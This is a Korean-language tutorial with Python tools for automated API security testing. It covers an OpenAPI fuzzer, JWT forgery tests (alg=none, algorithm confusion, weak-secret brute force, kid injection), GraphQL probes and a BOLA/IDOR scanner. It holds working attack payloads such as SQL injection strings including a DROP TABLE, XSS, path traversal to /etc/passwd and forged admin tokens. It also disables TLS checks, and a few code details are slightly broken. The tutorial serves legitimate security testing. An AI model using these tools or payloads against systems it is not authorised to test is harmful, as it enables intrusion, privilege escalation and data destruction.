# API 보안 테스트 자동화

OpenAPI 명세 기반 자동 퍼징, OAuth/JWT 보안 테스트, GraphQL 취약점 자동화, 비즈니스 로직 취약점 테스트를 Python으로 구현한다.

---

## 1. OpenAPI 기반 자동 퍼징

### 1.1 Swagger/OpenAPI 파서 및 퍼저

```python
#!/usr/bin/env python3
"""OpenAPI 명세 기반 자동 API 보안 퍼저"""
import argparse
import itertools
import json
import random
import string
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

import requests
import yaml


@dataclass
class APIEndpoint:
    path: str
    method: str
    parameters: list[dict]
    request_body: dict | None
    auth_required: bool
    tags: list[str]


@dataclass
class FuzzResult:
    endpoint: str
    method: str
    payload: dict
    status_code: int
    response_time: float
    finding: str = ""


class OpenAPIFuzzer:
    def __init__(self, spec_path: str | Path, base_url: str, api_key: str = "") -> None:
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.session = requests.Session()
        if api_key:
            self.session.headers["Authorization"] = f"Bearer {api_key}"

        spec_path = Path(spec_path)
        with spec_path.open() as f:
            if spec_path.suffix in (".yaml", ".yml"):
                self.spec = yaml.safe_load(f)
            else:
                self.spec = json.load(f)

        self.endpoints = self._parse_endpoints()

    def _parse_endpoints(self) -> list[APIEndpoint]:
        endpoints = []
        for path, methods in self.spec.get("paths", {}).items():
            for method, details in methods.items():
                if method not in ("get", "post", "put", "patch", "delete"):
                    continue

                auth_required = bool(details.get("security", self.spec.get("security")))
                endpoints.append(APIEndpoint(
                    path=path,
                    method=method.upper(),
                    parameters=details.get("parameters", []),
                    request_body=details.get("requestBody"),
                    auth_required=auth_required,
                    tags=details.get("tags", []),
                ))
        return endpoints

    def _generate_fuzz_values(self, schema: dict) -> list[Any]:
        data_type = schema.get("type", "string")
        values = []

        if data_type == "string":
            values = [
                "",                          # 빈 문자열
                "A" * 10000,                # 긴 문자열
                "' OR '1'='1",              # SQLi
                "<script>alert(1)</script>", # XSS
                "../../../etc/passwd",       # Path Traversal
                "${7*7}",                   # SSTI
                "%00",                      # Null Byte
                "{{7*7}}",                  # Template Injection
                "0",
                "-1",
                "null",
                "undefined",
            ]
        elif data_type == "integer":
            values = [
                0, -1, -2147483648, 2147483647,
                9999999999, -9999999999,
                "abc", "1.5", "", "null",
            ]
        elif data_type == "boolean":
            values = [True, False, "true", "false", "1", "0", "", "null"]
        elif data_type == "array":
            values = [[], ["A" * 1000] * 100, None, "not_an_array"]

        return values

    def fuzz_endpoint(self, endpoint: APIEndpoint) -> list[FuzzResult]:
        results = []
        url = self.base_url + endpoint.path

        # 경로 파라미터 치환
        if "{" in url:
            import re
            path_params = re.findall(r"\{(\w+)\}", url)
            for param in path_params:
                url = url.replace(f"{{{param}}}", "1")

        # 파라미터 퍼징
        for param in endpoint.parameters:
            schema = param.get("schema", {"type": "string"})
            fuzz_values = self._generate_fuzz_values(schema)

            for value in fuzz_values[:5]:  # 상위 5개만
                params = {param["name"]: value}
                try:
                    import time
                    start = time.time()
                    resp = self.session.request(
                        endpoint.method,
                        url,
                        params=params if endpoint.method == "GET" else None,
                        json=params if endpoint.method != "GET" else None,
                        timeout=10,
                        verify=False,
                    )
                    elapsed = time.time() - start

                    finding = self._analyze_response(resp, value)
                    if finding:
                        results.append(FuzzResult(
                            endpoint=endpoint.path,
                            method=endpoint.method,
                            payload={param["name"]: str(value)[:50]},
                            status_code=resp.status_code,
                            response_time=elapsed,
                            finding=finding,
                        ))

                except requests.RequestException:
                    pass

        return results

    def _analyze_response(self, resp: requests.Response, payload: Any) -> str:
        # 서버 오류는 잠재적 취약점
        if resp.status_code == 500:
            return f"서버 오류 (500) — 내부 오류 노출 가능"

        body = resp.text.lower()

        # 오류 메시지에서 기술 스택 노출
        if any(kw in body for kw in ["traceback", "exception", "stack trace", "sql syntax", "ora-"]):
            return f"스택 트레이스/DB 오류 노출"

        # SQLi 징후
        if any(kw in body for kw in ["mysql", "postgresql", "sqlite", "syntax error near"]):
            return f"SQL 오류 메시지 노출 — SQLi 가능성"

        # 경로 탐색 성공
        if "root:" in resp.text or "daemon:" in resp.text:
            return f"경로 탐색 성공 — /etc/passwd 내용 포함"

        # 응답 시간 기반 (10초 이상 = 시간 기반 인젝션)
        if resp.elapsed.total_seconds() > 8:
            return f"응답 지연 ({resp.elapsed.total_seconds():.1f}초) — 시간 기반 인젝션 가능성"

        return ""

    def run(self) -> list[FuzzResult]:
        all_results = []
        print(f"[*] {len(self.endpoints)}개 엔드포인트 퍼징 시작")
        for endpoint in self.endpoints:
            results = self.fuzz_endpoint(endpoint)
            all_results.extend(results)
            if results:
                for r in results:
                    print(f"  [!] {r.method} {r.endpoint}: {r.finding}")
        return all_results


def main() -> None:
    parser = argparse.ArgumentParser(description="OpenAPI 자동 퍼저")
    parser.add_argument("spec", help="OpenAPI 명세 파일 (JSON/YAML)")
    parser.add_argument("--base-url", required=True, help="API 기본 URL")
    parser.add_argument("--api-key", default="", help="인증 토큰")
    parser.add_argument("-o", "--output", help="결과 JSON 저장")
    args = parser.parse_args()

    fuzzer = OpenAPIFuzzer(args.spec, args.base_url, args.api_key)
    results = fuzzer.run()

    print(f"\n[+] 총 {len(results)}개 취약점 후보 발견")
    if args.output:
        import json as json_mod
        Path(args.output).write_text(
            json_mod.dumps([vars(r) for r in results], indent=2, ensure_ascii=False)
        )


if __name__ == "__main__":
    main()
```

---

## 2. JWT 보안 테스트

### 2.1 JWT 취약점 자동 탐지

```python
#!/usr/bin/env python3
"""JWT 보안 취약점 자동 테스터"""
import argparse
import base64
import hashlib
import hmac
import json
import time
from typing import Optional


class JWTSecurityTester:
    def __init__(self, target_url: str, token: str) -> None:
        self.target_url = target_url
        self.original_token = token
        self.header, self.payload, self.signature = self._decode_parts(token)

    def _decode_parts(self, token: str) -> tuple[dict, dict, bytes]:
        parts = token.split(".")
        if len(parts) != 3:
            raise ValueError("유효하지 않은 JWT 형식")

        def decode(part: str) -> dict:
            padded = part + "=" * (4 - len(part) % 4)
            return json.loads(base64.urlsafe_b64decode(padded))

        sig = base64.urlsafe_b64decode(parts[2] + "=" * (4 - len(parts[2]) % 4))
        return decode(parts[0]), decode(parts[1]), sig

    def _encode_token(self, header: dict, payload: dict, signature: bytes = b"") -> str:
        def encode(d: dict) -> str:
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

        h = encode(header)
        p = encode(payload)
        s = base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
        return f"{h}.{p}.{s}"

    def test_algorithm_none(self) -> Optional[str]:
        """alg=none 공격: 서명 검증 우회"""
        modified_header = {**self.header, "alg": "none"}
        modified_payload = {**self.payload, "role": "admin", "exp": int(time.time()) + 3600}
        token = self._encode_token(modified_header, modified_payload, b"")
        # 서명 부분을 완전히 제거
        parts = token.split(".")
        return f"{parts[0]}.{parts[1]}."

    def test_hs256_with_rs256_pubkey(self, public_key: str) -> Optional[str]:
        """RS256 → HS256 알고리즘 혼동 공격"""
        modified_header = {**self.header, "alg": "HS256"}
        modified_payload = {**self.payload, "role": "admin"}

        def encode(d: dict) -> str:
            return base64.urlsafe_b64encode(json.dumps(d, separators=(",", ":")).encode()).rstrip(b"=").decode()

        h = encode(modified_header)
        p = encode(modified_payload)
        message = f"{h}.{p}".encode()

        key = public_key.encode() if isinstance(public_key, str) else public_key
        sig = hmac.new(key, message, hashlib.sha256).digest()
        s = base64.urlsafe_b64encode(sig).rstrip(b"=").decode()
        return f"{h}.{p}.{s}"

    def test_weak_secret(self, wordlist: Optional[list[str]] = None) -> Optional[str]:
        """약한 비밀키 브루트포스"""
        if wordlist is None:
            wordlist = [
                "secret", "password", "12345", "admin", "key",
                "jwt_secret", "mysecret", "changeme", "supersecret",
            ]

        header_b64 = self.original_token.split(".")[0]
        payload_b64 = self.original_token.split(".")[1]
        message = f"{header_b64}.{payload_b64}".encode()

        original_sig = self.signature

        for candidate in wordlist:
            sig = hmac.new(candidate.encode(), message, hashlib.sha256).digest()
            if sig == original_sig:
                return candidate

        return None

    def test_expiry_bypass(self) -> str:
        """만료 시간 조작"""
        modified_payload = {**self.payload, "exp": 9999999999}
        return self._encode_token(self.header, modified_payload, self.signature)

    def test_kid_injection(self) -> str:
        """kid (Key ID) SQL/Path 인젝션"""
        modified_header = {
            **self.header,
            "kid": "../../dev/null",  # 빈 파일로 빈 키 사용
        }
        sig = hmac.new(b"", f"{self.original_token.split('.')[0]}.{self.original_token.split('.')[1]}".encode(), hashlib.sha256).digest()
        return self._encode_token(modified_header, self.payload, sig)

    def run_all_tests(self) -> dict:
        results = {}

        print("[*] alg=none 공격 테스트...")
        results["alg_none"] = self.test_algorithm_none()

        print("[*] 약한 비밀키 브루트포스...")
        weak_key = self.test_weak_secret()
        results["weak_key"] = weak_key
        if weak_key:
            print(f"  [!!!] 약한 키 발견: {weak_key}")

        print("[*] kid 인젝션 페이로드 생성...")
        results["kid_injection"] = self.test_kid_injection()

        return results


def main() -> None:
    parser = argparse.ArgumentParser(description="JWT 보안 테스터")
    parser.add_argument("token", help="분석할 JWT 토큰")
    parser.add_argument("--target", help="테스트 대상 URL")
    parser.add_argument("--wordlist", help="비밀키 워드리스트 파일")
    args = parser.parse_args()

    wordlist = None
    if args.wordlist:
        wordlist = Path(args.wordlist).read_text().splitlines()

    tester = JWTSecurityTester(args.target or "http://localhost", args.token)

    print(f"[*] 헤더: {tester.header}")
    print(f"[*] 페이로드: {tester.payload}")

    results = tester.run_all_tests()
    for test_name, result in results.items():
        if result:
            print(f"[+] {test_name}: {str(result)[:100]}")


if __name__ == "__main__":
    main()
```

---

## 3. GraphQL 보안 테스트

```python
#!/usr/bin/env python3
"""GraphQL API 취약점 자동 탐지"""
import argparse
import json
from typing import Any

import requests


class GraphQLSecurityTester:
    INTROSPECTION_QUERY = """
    {
      __schema {
        types { name kind fields { name type { name kind } } }
        queryType { name }
        mutationType { name }
        subscriptionType { name }
      }
    }
    """

    def __init__(self, endpoint: str, headers: dict | None = None) -> None:
        self.endpoint = endpoint
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        self.session.headers["Content-Type"] = "application/json"

    def query(self, gql_query: str, variables: dict = None) -> dict:
        payload = {"query": gql_query}
        if variables:
            payload["variables"] = variables
        resp = self.session.post(self.endpoint, json=payload, timeout=15, verify=False)
        resp.raise_for_status()
        return resp.json()

    def test_introspection(self) -> dict:
        try:
            result = self.query(self.INTROSPECTION_QUERY)
            schema = result.get("data", {}).get("__schema", {})
            if schema:
                types = [t["name"] for t in schema.get("types", []) if not t["name"].startswith("__")]
                return {
                    "enabled": True,
                    "types": types[:20],
                    "finding": "인트로스펙션 활성화 — 스키마 완전 노출 가능",
                }
        except Exception:
            pass
        return {"enabled": False}

    def test_batch_query(self, simple_query: str) -> dict:
        """배치 쿼리로 속도 제한 우회 테스트"""
        batch = [{"query": simple_query}] * 100
        try:
            resp = self.session.post(self.endpoint, json=batch, timeout=30, verify=False)
            if isinstance(resp.json(), list) and len(resp.json()) == 100:
                return {"vulnerable": True, "finding": "배치 쿼리 허용 — 속도 제한 우회 가능"}
        except Exception:
            pass
        return {"vulnerable": False}

    def test_depth_limit(self) -> dict:
        """깊이 제한 없는 쿼리 (DoS 가능성)"""
        deep_query = "{ " + "user { " * 20 + "id " + "} " * 20 + " }"
        try:
            result = self.query(deep_query)
            if "errors" not in result:
                return {"vulnerable": True, "finding": "쿼리 깊이 제한 없음 — DoS 가능"}
        except Exception:
            pass
        return {"vulnerable": False}

    def test_field_suggestion(self) -> dict:
        """필드 제안으로 숨겨진 필드 발견"""
        result = self.query("{ user { pasword } }")  # 오타 의도
        errors = result.get("errors", [])
        for error in errors:
            message = error.get("message", "")
            if "Did you mean" in message:
                return {
                    "finding": f"필드 제안 기능 활성화: {message}",
                    "suggested_fields": message,
                }
        return {}

    def test_sql_injection_via_graphql(self, type_name: str, field: str) -> list[str]:
        findings = []
        payloads = ["' OR '1'='1", "\" OR 1=1--", "1; DROP TABLE users--"]

        for payload in payloads:
            query = f'{{ {type_name}({field}: "{payload}") {{ id }} }}'
            try:
                result = self.query(query)
                body = json.dumps(result)
                if any(kw in body.lower() for kw in ["syntax error", "mysql", "postgresql", "sql"]):
                    findings.append(f"SQL 오류 노출: {payload}")
            except Exception:
                pass

        return findings

    def run_all_tests(self) -> dict:
        results = {}

        print("[*] 인트로스펙션 테스트...")
        results["introspection"] = self.test_introspection()

        print("[*] 배치 쿼리 테스트...")
        results["batch_query"] = self.test_batch_query("{ __typename }")

        print("[*] 깊이 제한 테스트...")
        results["depth_limit"] = self.test_depth_limit()

        print("[*] 필드 제안 테스트...")
        results["field_suggestion"] = self.test_field_suggestion()

        return results


def main() -> None:
    parser = argparse.ArgumentParser(description="GraphQL 보안 테스터")
    parser.add_argument("endpoint", help="GraphQL 엔드포인트 URL")
    parser.add_argument("--token", help="인증 토큰")
    args = parser.parse_args()

    headers = {"Authorization": f"Bearer {args.token}"} if args.token else {}
    tester = GraphQLSecurityTester(args.endpoint, headers)
    results = tester.run_all_tests()

    for test, result in results.items():
        if result.get("enabled") or result.get("vulnerable") or result.get("finding"):
            print(f"[!] {test}: {result.get('finding', result)}")


if __name__ == "__main__":
    main()
```

---

## 4. BOLA/IDOR 자동 탐지

```python
#!/usr/bin/env python3
"""BOLA (Broken Object Level Authorization) 자동 탐지"""
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


class BOLATester:
    def __init__(self, base_url: str, victim_token: str, attacker_token: str) -> None:
        self.base_url = base_url
        self.victim_session = requests.Session()
        self.victim_session.headers["Authorization"] = f"Bearer {victim_token}"
        self.attacker_session = requests.Session()
        self.attacker_session.headers["Authorization"] = f"Bearer {attacker_token}"

    def test_idor(self, path_template: str, id_range: range) -> list[dict]:
        findings = []

        def check_id(object_id: int) -> dict | None:
            url = self.base_url + path_template.format(id=object_id)
            victim_resp = self.victim_session.get(url, timeout=5, verify=False)

            if victim_resp.status_code != 200:
                return None

            attacker_resp = self.attacker_session.get(url, timeout=5, verify=False)

            if attacker_resp.status_code == 200:
                return {
                    "id": object_id,
                    "url": url,
                    "finding": f"BOLA 취약점: 공격자가 ID {object_id} 접근 성공",
                    "victim_response_len": len(victim_resp.text),
                    "attacker_response_len": len(attacker_resp.text),
                }
            return None

        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {executor.submit(check_id, i): i for i in id_range}
            for future in as_completed(futures):
                result = future.result()
                if result:
                    findings.append(result)
                    print(f"[!!!] BOLA: {result['url']}")

        return findings


def main() -> None:
    parser = argparse.ArgumentParser(description="BOLA/IDOR 테스터")
    parser.add_argument("base_url")
    parser.add_argument("path_template", help="예: /api/users/{id}/profile")
    parser.add_argument("--victim-token", required=True)
    parser.add_argument("--attacker-token", required=True)
    parser.add_argument("--id-start", type=int, default=1)
    parser.add_argument("--id-end", type=int, default=100)
    args = parser.parse_args()

    tester = BOLATester(args.base_url, args.victim_token, args.attacker_token)
    findings = tester.test_idor(args.path_template, range(args.id_start, args.id_end + 1))
    print(f"\n[+] BOLA 취약점: {len(findings)}건 발견")


if __name__ == "__main__":
    main()
```
